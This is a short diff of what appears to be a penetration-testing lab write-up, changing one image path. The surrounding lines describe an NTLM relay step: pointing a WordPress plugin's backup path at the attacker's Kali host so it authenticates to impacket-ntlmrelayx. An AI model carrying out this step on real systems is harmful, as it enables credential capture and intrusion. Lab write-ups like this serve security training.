@@ -453,7 +453,7 @@ listening on [any] 9999 ...
 With everything setup we can modify the Backup directory path.
 
 Set the path to the URI reference `//192.168.45.163/test` where the IP is our Kali machine and `/test` is a nonexistent path.
-![156b67d1d13a6a7b87d4587904efcffa.png](assets/static/resources/156b67d1d13a6a7b87d4587904efcffa.png)
+![156b67d1d13a6a7b87d4587904efcffa.png](../_resources/156b67d1d13a6a7b87d4587904efcffa.png)
 - Once entered scroll down and click Save.
     - This causes the WP plugin to auth to our `impacket-ntlmrelayx` in the context of the user running WP.
 
